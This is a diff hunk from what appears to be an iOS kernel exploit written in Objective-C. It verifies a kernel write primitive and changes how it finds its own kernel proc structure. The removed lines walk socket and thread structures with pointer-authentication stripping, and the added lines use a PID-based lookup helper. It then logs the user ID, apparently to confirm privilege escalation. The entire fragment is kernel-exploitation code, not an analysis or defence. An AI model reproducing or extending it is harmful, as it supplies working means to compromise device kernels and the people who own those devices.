@@ -734,28 +734,12 @@
                 testVal, rb, (rb == testVal) ? "VERIFIED" : "FAILED"];
             kwrite_zone_element_qword(chksumAddr, orig, pcb, 0x200);
 
-            // Step 2: find self proc via controlPcb walk
-            extern uint64_t proc_self(void);
-            extern uint64_t darksword_control_pcb(void);
+            // Step 2: find self proc via allproc walk
             extern uint64_t early_kread64(uint64_t where);
-            extern uint64_t xpaci(uint64_t ptr);
-            uint64_t proc = proc_self();
-            if (!proc) {
-                // Walk from controlPcb: inpcb → socket → thread → proc
-                uint64_t cpcb = darksword_control_pcb();
-                if (cpcb) {
-                    extern uint32_t off_inpcb_inp_socket;
-                    extern uint32_t off_socket_so_background_thread;
-                    extern uint32_t off_thread_t_tro;
-                    extern uint32_t off_thread_ro_tro_proc;
-                    uint64_t sock = xpaci(early_kread64(cpcb + off_inpcb_inp_socket));
-                    uint64_t thr = xpaci(early_kread64(sock + off_socket_so_background_thread));
-                    uint64_t thrRO = xpaci(early_kread64(thr + off_thread_t_tro));
-                    proc = xpaci(early_kread64(thrRO + off_thread_ro_tro_proc));
-                    [r appendFormat:@"  proc via controlPcb walk: sock=0x%016llx thr=0x%016llx proc=0x%016llx\n",
-                        sock, thr, proc];
-                }
-            }
+            uint64_t proc = 0;
+            // Use KPDump's findSelfProcByPidFast via a helper
+            extern uint64_t kp_find_self_proc_by_pid(uint32_t pid);
+            proc = kp_find_self_proc_by_pid(getpid());
             [r appendFormat:@"  getuid() = %d\n", getuid()];
             if (proc) {
                 [r appendFormat:@"  self proc = 0x%016llx\n", proc];
